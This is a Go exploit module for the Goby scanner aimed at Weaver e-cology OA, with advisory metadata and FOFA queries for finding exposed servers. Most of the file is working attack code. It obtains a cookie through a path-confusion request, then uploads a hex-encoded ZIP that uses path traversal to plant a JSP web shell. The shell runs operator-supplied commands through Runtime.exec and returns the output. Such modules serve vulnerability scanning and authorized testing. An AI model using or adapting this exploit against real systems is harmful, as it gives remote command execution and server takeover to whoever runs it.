package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver e-cology OA check API file upload getshell",
    "Description": "<p>There is a file upload vulnerability in Weaver OA check API, attackers can upload webshell to obtain server permissions.</p>",
    "Impact": "<p>Weaver e-cology OA check API file upload getshell</p>",
    "Recommendation": "<p>1. Please contact to try to fix the vulnerability in time: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com .cn/</a></p><p>2. Set access policies and whitelist access through firewalls and other security devices. </p><p>3. If not necessary, prohibit public network from accessing the system. </p>",
    "Product": "Weaver-OA",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload",
        "Information technology application innovation industry"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微 e-cology OA 检查 API 文件上传漏洞",
            "Product": "泛微-协同办公OA",
            "Description": "<p>泛微e-cology协同OA办公系统平台主要功能包括了考勤管理、协同办公、信息门户、移动办公、流程管理、财务管理、人力资源管理等功能。</p>",
            "Recommendation": "<p>1、请联系尝试及时修复该漏洞：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>泛微e-cology协同OA办公系统平台主要功能包括了考勤管理、协同办公、信息门户、移动办公、流程管理、财务管理、人力资源管理等功能。<br></p><p>该系统存在文件上传漏洞，该漏洞可能导致攻击者在服务器上传后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "信创"
            ]
        },
        "EN": {
            "Name": "Weaver e-cology OA check API file upload getshell",
            "Product": "Weaver-OA",
            "Description": "<p>There is a file upload vulnerability in Weaver OA check API, attackers can upload webshell to obtain server permissions.</p>",
            "Recommendation": "<p>1. Please contact to try to fix the vulnerability in time: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com .cn/</a></p><p>2. Set access policies and whitelist access through firewalls and other security devices. </p><p>3. If not necessary, prohibit public network from accessing the system. </p>",
            "Impact": "<p>Weaver e-cology OA check API file upload getshell</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "Information technology application innovation industry"
            ]
        }
    },
    "FofaQuery": "(header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\")",
    "GobyQuery": "(header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\")",
    "Author": "itardc@163.com",
    "Homepage": "http://www.weaver.com.cn/",
    "DisclosureDate": "2021-04-09",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Weaver-OA"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10186"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/mobilemode/showdata.js%70;1.js")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "userId=21"
			cookie := ""
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil &&
				resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "Set-Cookie") &&
				strings.Contains(resp.Utf8Html, "/spa/edc/static4mobile/index.html") {
				cookie = resp.Cookie
			} else {
				return false
			}
			log.Println(cookie)
			randomFilename := goutils.RandomHexString(19)
			randomFilenameHexString := hex.EncodeToString([]byte(randomFilename))
			payload := "504b0304140000000000fd8d95524c6c513120000000200000002e0000002e2e2f2e2e2f2e2e2f2e2e2f6d6f62696c656d6f64652f6d6f64654c69737449647355736572436f72642e6a73703c256f75742e7072696e746c6e282268656c6c6f2c776f726c6422293b253e0a504b01021403140000000000fd8d95524c6c513120000000200000002e0000000000000000000000a481000000002e2e2f2e2e2f2e2e2f2e2e2f6d6f62696c656d6f64652f6d6f64654c69737449647355736572436f72642e6a7370504b050600000000010001005c0000006c0000000000"
			payload = strings.ReplaceAll(payload, "6d6f64654c69737449647355736572436f7264", randomFilenameHexString)
			payloadHexBytes, err := hex.DecodeString(payload)
			if err != nil {
				return false
			}
			cfg.Header.Delete("Content-Type")
			cfg.URI = "/api/ec/tool/validate/check"
			cfg.Header.Store("Cookie", cookie)
			cfg.Data = string(payloadHexBytes)
			httpclient.DoHttpRequest(u, cfg)
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + fmt.Sprintf("/mobilemode/%s.jsp", randomFilename)); err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "hello,world") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/mobilemode/showdata.js%70;1.js")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "userId=21"
			cookie := ""
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil &&
				resp.StatusCode == 200 {
				cookie = resp.Cookie
			}
			log.Println(cookie)
			randomFilename := goutils.RandomHexString(19)
			randomFilenameHexString := hex.EncodeToString([]byte(randomFilename))
			payload := "504b0304140000000000559c9552d048662fc3000000c30000002e0000002e2e2f2e2e2f2e2e2f2e2e2f6d6f62696c656d6f64652f6d6f64654c69737449647355736572436f72642e6a73703c256a6176612e696f2e496e70757453747265616d20696e203d2052756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d65746572282276756c676f2229292e676574496e70757453747265616d28293b696e742061203d202d313b627974655b5d2062203d206e657720627974655b323034385d3b7768696c652828613d696e2e7265616428622929213d2d31297b6f75742e7072696e746c6e286e657720537472696e67286229293b7d253e0a504b01021403140000000000559c9552d048662fc3000000c30000002e0000000000000000000000a481000000002e2e2f2e2e2f2e2e2f2e2e2f6d6f62696c656d6f64652f6d6f64654c69737449647355736572436f72642e6a7370504b050600000000010001005c0000000f0100000000"
			payload = strings.ReplaceAll(payload, "6d6f64654c69737449647355736572436f7264", randomFilenameHexString)
			payloadHexBytes, err := hex.DecodeString(payload)
			if err != nil {
				return expResult
			}
			cfg.Header.Delete("Content-Type")
			cfg.URI = "/api/ec/tool/validate/check"
			cfg.Header.Store("Cookie", cookie)
			cfg.Data = string(payloadHexBytes)
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			cmd := ss.Params["cmd"].(string)
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/mobilemode/%s.jsp?vulgo=%s", randomFilename, cmd)); err == nil && resp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
